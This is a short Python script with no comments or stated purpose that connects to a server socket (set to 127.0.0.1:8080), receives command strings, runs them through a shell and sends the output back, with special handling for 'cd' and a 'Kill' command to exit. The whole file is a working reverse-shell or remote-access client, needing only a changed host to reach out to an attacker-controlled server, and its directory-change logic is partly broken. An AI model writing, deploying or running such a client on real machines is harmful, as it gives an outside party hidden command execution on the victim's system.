from subprocess import Popen,PIPE
import os
import socket
host="127.0.0.1"
port=8080
print((host,port))
server=socket.socket()
server.connect((host,int(port)))

while True:
    try:
        comand=server.recv(1024).decode("UTF-8")
        print(comand)
        if "cd" in comand:
            orders=[_ for _ in comand.split(" ")]
            if '..'  in orders:
                print(orders)
                pros=Popen(orders[0],shell=True,stdout=PIPE,stderr=PIPE,stdin=PIPE)
                res,err=pros.communicate()
                res=res.decode("UTF-8")
                print(res)
                path=res.split(f"\\")
                path.remove(path[len(path)-1])
                path="\\".join(_ for _ in path)
                os.chdir(path)
                server.send(bytes(path,encoding="UTF-8"))
            else:
                pros=Popen(orders[0],shell=True,stdout=PIPE,stderr=PIPE,stdin=PIPE)
                res,err=pros.communicate()
                print(orders)
                print(res.decode("UTF-8"),'ERR:',err)
                print(str(res.decode("UTF-8")).replace("\n","").replace("\r","")+f'\{orders[1]}')
                os.chdir(str(res.decode("UTF-8")).replace("\n","").replace("\r","")+f'\{orders[1]}')
                if res != None:
                    server.send(res)
                else:
                    server.send(err)
        elif "Kill" in comand:
            exit()
        else:
            pros=Popen([_ for _ in comand.split(" ")],shell=True,stdout=PIPE,stderr=PIPE,stdin=PIPE)
            res,err=pros.communicate()  
            if res != None:
                server.send(res)
            else:
                server.send(err)
    except Exception as e :
        print(e)